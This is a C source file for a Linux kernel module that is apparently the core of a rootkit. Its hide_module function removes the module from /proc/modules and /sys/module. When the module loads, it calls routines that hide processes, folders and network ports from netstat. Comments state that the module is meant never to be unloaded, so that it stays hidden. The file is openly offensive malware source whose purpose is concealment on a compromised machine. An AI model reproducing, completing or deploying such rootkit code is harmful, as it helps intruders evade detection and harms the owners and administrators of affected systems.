#include "hide_process.h"
#include "hide_folder.h"
#include "hide_netstat.h"


// ----------------- HIDE MODULE -----------------

/*
Hide LKM
Information is removed from:
    /proc/modules
    /sys/module
*/
void hide_module(void)
{
	//remove from proc/modules	
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	//remove from sys/module/	
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
}


// ----------------- INIT/EXIT FUNCTIONS -----------------


// Function triggered when lkm is loaded
static int __init my_init(void)
{
	// hide_module();
	hide_process();
	hide_folder();
	hide_ports();

	return 0;
}

// Function triggered when lkm is unloaded (this will never happen)
static void __exit my_exit(void)
{
	// We want to be hidden so this should never be triggered
	// However, they are handy for debugging and trying new
	// things out.
	unhide_process();
	unhide_folder();

	// This does not work properly, after rmmod
	// netstat will be broken
	unhide_ports();
}

module_init(my_init);
module_exit(my_exit);

MODULE_LICENSE("GPL");
